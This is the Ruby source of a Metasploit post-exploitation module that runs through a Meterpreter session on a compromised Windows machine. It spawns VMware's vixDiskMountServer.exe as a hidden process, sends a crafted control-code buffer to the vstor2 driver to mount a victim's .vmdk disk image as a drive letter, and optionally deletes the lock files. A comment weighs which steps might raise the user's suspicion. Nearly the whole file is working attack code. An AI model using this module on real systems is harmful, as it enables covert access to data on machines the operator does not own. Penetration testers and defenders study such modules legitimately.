##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Windows Manage VMDK Mount Drive',
      'Description'  => %q{
        This module mounts a vmdk file (Virtual Machine Disk) on a drive provided by the user by taking advantage
        of the vstor2 device driver (VMware). First, it executes the binary vixDiskMountServer.exe to access the
        device and then it sends certain control code via DeviceIoControl to mount it. Use the write mode with
        extreme care. You should only open a disk file in writable mode if you know for sure that no snapshots
        or clones are linked from the file.
      },
      'License'      => MSF_LICENSE,
      'Author'       => 'Borja Merino <bmerinofe[at]gmail.com>',
      'References'   =>
        [
          ['URL', 'http://www.shelliscoming.com/2017/05/post-exploitation-mounting-vmdk-files.html']
        ],
      'Platform'     => ['win'],
      'SessionTypes' => ['meterpreter']
    ))

    register_options(
      [
        OptString.new('VMDK_PATH', [true, 'Full path to the .vmdk file']),
        OptString.new('DRIVE', [true, 'Mount point (drive letter)', 'Z']),
        OptBool.new('READ_MODE', [true, 'Open file in read-only mode', true]),
        OptBool.new('DEL_LCK', [true, 'Delete .vmdk lock file', false]),
      ]
    )
  end

  # It returns an array of the drives currently mounted. Credits to mubix for this function.
  def get_drives
    a = client.railgun.kernel32.GetLogicalDrives()["return"]
    drives = []
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    (0..25).each do |i|
      test = letters[i,1]
      rem = a % (2**(i+1))
      if rem > 0
        drives << test
        a = a - rem
      end
    end

    drives
  end

  def run
    vol = datastore['DRIVE'][0].upcase
    vmdk = datastore['VMDK_PATH']
    if vol.count("EFGHIJKLMNOPQRSTUVWXYZ") == 0
      print_error("Wrong drive letter. Choose another one")
      return
    end

    drives = get_drives
    if drives.include? vol
      print_error("The following mount points already exists: #{drives}. Choose another one")
      return
    end

    # Using stat instead of file? to check if the file exists due to this https://github.com/rapid7/metasploit-framework/issues/8202
    begin
      client.fs.file.stat(vmdk)
    rescue
      print_error("File #{vmdk} not found")
      return
    end

    vmware_path = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vmplayer.exe","path")

    if vmware_path.nil?
      print_error("VMware installation path not found.")
      return
    end

    print_status("VMware path: \"#{vmware_path}\"")

    vstor_device = find_vstor2_device
    if vstor_device.nil?
      return
    end

    if !open_mountserver(vmware_path) || !mount_vmdk(vstor_device, vmdk, vol, datastore['READ_MODE'])
      return
    end

    # Just few seconds to mount the unit and create the lck file
    sleep(5)

    if get_drives.include? vol
      print_good("The drive #{vol}: seems to be ready")
      if datastore['DEL_LCK']
        delete_lck(vmdk)
      end
    else
      print_error("The drive couldn't be mounted. Check if a .lck file is blocking the access to the vmdk file")
      # Some snapshots could give some problems when are mount in write mode
      if !datastore['READ_MODE']
        print_status("Try to mount the drive in read only mode")
      end
    end
  end

  # Delete the lck file generated after mounting the drive
  def delete_lck(vmdk)
    lck_dir = vmdk << ".lck"
    begin
      files = client.fs.dir.entries(lck_dir)
      vprint_status("Directory lock: #{lck_dir}")
    rescue Rex::Post::Meterpreter::RequestError
      print_status("It was not found a lck directory")
      return
    end

    files.shift(2)
    files.each do |f|
      f_path = lck_dir + "\\#{f}"
      next if !file?(f_path)
      fd = client.fs.file.open(f_path)
      content =  fd.read.to_s
      fd.close
      if content.include? "vixDiskMountServer"
        begin
          client.fs.file.rm(f_path)
          print_status("Lock file #{f} deleted")
        rescue ::Exception => e
          print_error("Unable to remove file: #{e.message}")
        end
      end
    end
  end

  # Recover the device drive name created by vstor2-mntapi20-shared.sys
  def find_vstor2_device
    reg_services = "HKLM\\SYSTEM\\ControlSet001\\Services\\"
    devices = registry_enumkeys(reg_services)
    vstor2_key = devices.grep(/^vstor2/)
    if !vstor2_key.any?
      print_error("No vstor2 key found on #{reg_services}")
      return
    end

    device_path = registry_getvaldata(reg_services << vstor2_key[0],"ImagePath")

    if device_path.nil?
      print_error("No image path found for the vstor2 device")
      return
    end

    device_name = device_path.split('\\')[-1].split('.')[0]
    print_status("Device driver name found: \\\\.\\#{device_name}")
    device_name.insert(0, "\\\\.\\")
  end

  # Mount the vmdk file by sending a magic control code via DeviceIoControl
  def mount_vmdk(vstore, vmdk_file, vol, read_mode)
    # DWORD value representing the drive letter
    i = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".index(vol)
    drive_dword = [(0x00000001 << i)].pack('V')
    vprint_status("DWORD value for drive #{vol}: = #{drive_dword.inspect}")

    ret = session.railgun.kernel32.CreateFileW(vstore, "GENERIC_WRITE|GENERIC_READ", "FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "OPEN_EXISTING",0, nil)
    if ret['GetLastError'] != 0
      print_error("Unable to open a handle to the #{vstore} device driver. GetLastError: #{ret['GetLastError']} ")
      return false
    end
    # fd1, fd3 and fd5 are static values used from vixDiskMountApi.dll to build the input buffer
    fd1 = "\x24\x01\x00\x00"
    fd2 = "\x00\x00\x00\x00"
    fd3 = "\xBA\xAB\x00\x00"
    fd4 = "\x00\x00\x00\x00"
    fd5 = "\x02\x00\x00\x00"
    fd6 = "\x00\x00\x00\x00"
    path = (vmdk_file).ljust 260, "\x00"
    if read_mode
      fd7 = "\x01\x00\x00\x00"
    else
      fd7 = "\x00\x00\x00\x00"
    end

    # The total length of the buffer should be 292
    buffer = fd1 << fd2 << fd3 << fd4 << fd5 << fd6 << drive_dword << path << fd7

    error_code = ""
    tries = 0
    loop do
      ioctl = client.railgun.kernel32.DeviceIoControl(ret['return'],0x2A002C,buffer,292,16348,16348,4,nil)
      error_code = ioctl['GetLastError']
      vprint_status("GetlastError DeviceIoControl = #{error_code}")
      tries += 1
      break if tries == 3 || (error_code != 31 && error_code != 6)
    end

    if error_code == 997 || error_code == 0
      client.railgun.kernel32.CloseHandle(ret['return'])
      return true
    else
      print_error("The vmdk file could't be mounted")
      return false
    end
  end

  # Run the hidden vixDiskMountServer process needed to interact with the driver
  def open_mountserver(path)
    mount_bin = "vixDiskMountServer.exe"
    if !file?(path << mount_bin)
      print_error("#{mount_bin} not found in \"#{path}\"")
      return false
    end

    # If the vixDiskMountServer process is created by VMware (i.e. when the mapping utility is used) it will not be
    # possible to mount the file. In this case killing vixDiskMountServer manually from Meterpreter and re-running
    # the script could be a solution (although this can raise suspicions to the user).

    # On the other hand, if vixDiskMountServer has been created by Meterpreter it would not be necessary to kill
    # the process to run the script again and mount another drive except if you change the mode (write or read only).
    # For this reason, to avoid this case, the process is relaunched automatically.
    p = session.sys.process.each_process.find { |i| i["name"] == mount_bin}

    if p
      if p["ppid"] != session.sys.process.getpid
        print_error("An instance of #{mount_bin} is already running by another process")
        return false
      else
        begin
          print_status("Killing the #{mount_bin} instance")
          session.sys.process.kill(p["pid"])
          sleep(1)
        rescue ::Rex::Post::Meterpreter::RequestError => error
          print_error("The #{mount_bin} instance depending on Meterpeter could not be killed")
          return false
        end
      end
    end

    begin
      proc = session.sys.process.execute(path, nil, {'Hidden' => true})
      sleep(1)
      print_good("Process #{mount_bin} successfully spawned (Pid: #{proc.pid})")
    rescue ::Rex::Post::Meterpreter::RequestError => error
      print_error("Binary #{mount_bin} could could not be spawned : #{error.to_s}")
      return false
    end

    true
  end
end
